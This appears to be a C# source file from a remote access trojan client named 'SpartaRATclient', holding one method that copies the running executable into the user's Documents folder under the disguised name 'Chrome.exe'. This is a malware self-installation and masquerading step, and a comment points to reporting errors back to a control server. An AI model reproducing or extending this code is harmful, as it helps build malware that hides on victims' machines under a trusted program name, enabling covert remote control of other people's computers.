﻿using RATclientSparta.Server.Send;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient
{
    public class FileCopy
    {
        //File copy
        public static String This()
        {
            string NewPath = @"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe";
            if (!File.Exists(NewPath))
            {
                try
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, NewPath);
                }
                catch (Exception r)
                {
                    //@TODO: Send errors to server
                }
            }
            else
                return "exist";
            return NewPath;
        }
    }
}
